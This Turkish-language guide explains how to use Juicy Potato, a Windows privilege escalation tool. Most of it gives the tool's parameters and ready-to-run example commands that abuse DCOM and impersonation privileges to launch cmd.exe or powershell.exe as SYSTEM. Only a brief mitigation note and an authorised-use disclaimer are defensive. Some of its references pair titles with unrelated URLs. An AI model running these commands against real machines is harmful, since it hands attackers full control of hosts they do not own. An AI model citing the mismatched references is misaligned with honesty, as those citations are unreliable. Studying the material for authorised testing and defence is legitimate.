# Juicy Potato Kullanım Rehberi

## Juicy Potato Nedir?

**Juicy Potato**, Windows hizmet hesaplarından **NT AUTHORITY\SYSTEM** seviyesine çıkmak için kullanılan bir Yerel Yetki Yükseltme (LPE) aracıdır. **RottenPotatoNG**'nin geliştirilmiş bir sürümüdür ve çeşitli CLSID'ler üzerinden DCOM nesnelerinin kötüye kullanılmasını sağlar.

Bu araç, **SeImpersonate** veya **SeAssignPrimaryToken** ayrıcalıklarına sahip kullanıcıların, yetkilerini yükseltmesine olanak tanır.

---

## Özellikler

JuicyPotato aşağıdaki özellikleri destekler:

1. **CLSID Hedefleme:**
   - İstediğiniz CLSID'yi seçebilirsiniz. Kullanılabilir CLSID'lerin işletim sistemine göre listesi [burada](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md) bulunabilir.

2. **COM Dinleme Portu:**
   - 6666 yerine istediğiniz bir portu tanımlayabilirsiniz.

3. **Dinleme IP Adresi:**
   - COM sunucusunu belirli bir IP adresinde dinleyebilirsiniz.

4. **İşlem Başlatma Modu:**
   - İmtiyazlı kullanıcının yetkilerine göre işlem başlatma yöntemini seçebilirsiniz:
     - CreateProcessWithToken (SeImpersonate gerekli)
     - CreateProcessAsUser (SeAssignPrimaryToken gerekli)
     - İkisi birden

5. **Komut Çalıştırma:**
   - Sömürü başarılı olursa belirttiğiniz bir komut çalıştırabilirsiniz.

6. **RPC Sunucusu Desteği:**
   - Dış bir RPC sunucusuna kimlik doğrulama yapabilirsiniz.

7. **Test Modu:**
   - CLSID'leri test ederek yalnızca kullanıcı jetonunu yazdırabilirsiniz.

---

## Kullanım

JuicyPotato komut satırı argümanları ile çalışır. Zorunlu ve isteğe bağlı parametreleri aşağıda bulabilirsiniz:

### Zorunlu Parametreler:

```bash
-t <t/u/*>: Hangi CreateProcess çağrısının kullanılacağını belirtir.
    t: CreateProcessWithTokenW kullan
    u: CreateProcessAsUser kullan
    *: Her ikisini dene

-p <program>: Çalıştırılacak programın yolu

-l <port>: COM sunucusunun dinleme portu
```

### İsteğe Bağlı Parametreler:

```bash
-m <ip>: COM sunucusunun dinleme adresi (varsayılan 127.0.0.1)
-a <argument>: Programa geçilecek argümanlar (varsayılan NULL)
-k <ip>: RPC sunucusunun IP adresi (varsayılan 127.0.0.1)
-n <port>: RPC sunucusunun dinleme portu (varsayılan 135)
-c <{clsid}>: Kullanılacak CLSID (varsayılan BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
-z: CLSID'yi yalnızca test et ve jeton kullanıcısını yazdır
```

### Örnek Komutlar

1. Basit bir komut çalıştırma:
   ```bash
   JuicyPotato.exe -t * -p "cmd.exe" -a "/c whoami" -l 9999
   ```

2. Belirli bir CLSID ile test modu:
   ```bash
   JuicyPotato.exe -t * -c {clsid} -z
   ```

3. RPC sunucusuna bağlanarak işlem başlatma:
   ```bash
   JuicyPotato.exe -t t -p "powershell.exe" -k 192.168.1.10 -n 135
   ```

---

## Çalışma Prensibi

Eğer kullanıcı **SeImpersonate** veya **SeAssignPrimaryToken** yetkilerine sahipse, **SYSTEM** yetkilerini elde edebilirsiniz.

---

## Kısıtlamalar ve Öneriler

- Bu tür araçların kötüye kullanımını önlemek için hassas hesaplar ve uygulamalar dikkatlice korunmalıdır.
- **DCOM**'u devre dışı bırakmak, bu sömürü vektörünü engelleyebilir, ancak işletim sistemi üzerinde ciddi etkileri olabilir.

---

## Kaynaklar ve Referanslar

1. [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://googleprojectzero.blogspot.com/2016/02/the-definitive-guide-on-win32k-sys.html)
2. [DCOM DCE/RPC Local NTLM Reflection Elevation of Privilege](https://docs.microsoft.com/en-us/windows-server/security/windows-service-hardening)
3. [Potatoes and Tokens](https://github.com/ohpe/juicy-potato)

---

> **Uyarı:** Bu araç yalnızca yetkili test ortamlarında kullanılmalıdır. Yetkisiz kullanım yasadışıdır.
